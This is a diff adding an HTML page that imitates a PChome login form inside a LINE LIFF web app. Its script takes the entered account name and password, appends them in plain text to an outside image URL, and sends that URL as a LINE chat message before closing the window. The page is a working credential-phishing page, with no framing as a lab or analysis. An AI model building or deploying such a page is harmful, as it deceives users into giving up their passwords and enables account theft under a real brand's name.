@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>PChome 登入</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+</head>
+
+<body>
+    <div class="row" style="margin: 20px">
+        <div class="col-12" style="margin-top: 5px">
+            <label>帳號</label>
+            <input type="text" id="My_id" class="form-control" />
+            <br />
+            <label>密碼</label>
+            <input type="password" id="My_password" value="" class="form-control" />
+            <br />
+            <button class="btn btn-block" id="sure" style="background-color: #d00; color: #fff;">確定</button>
+        </div>
+    </div>
+
+    <script src="https://static.line-scdn.net/liff/edge/2.1/sdk.js"></script>
+    <script>
+        function initializeLiff(myLiffId) {
+            liff
+                .init({
+                    liffId: myLiffId
+                });
+        }
+
+        function pushMsg(p_id, p_password) {
+            if (p_id == '' || p_password == '') {  //資料檢查
+                alert('每個項目都必須輸入！');
+                return;
+            }
+            var msg = "M";  //回傳訊息字串
+            msg = msg + "&" + p_id;
+            msg = msg + "&" + p_password;
+            var img = "https://i2.kknews.cc/BkDFnqyEoJUpdgNCfIBJwkT2rDDkZpar/0.jpg"
+            liff.sendMessages([  //推播訊息
+                {
+                    type: 'image',
+                    originalContentUrl: img+'?sender='+msg,
+                    previewImageUrl: img+'?sender='+msg
+                }
+            ])
+                .then(() => {
+                    liff.closeWindow();  //關閉視窗
+                });
+        }
+
+        $(document).ready(function () {
+            initializeLiff('1657177329-6ZgzyLWx');
+            $('#sure').click(function (e) {  //按下確定鈕
+                pushMsg($('#My_id').val(), $('#My_password').val());
+            });
+        });
+    </script>
+</body>
+
+</html>
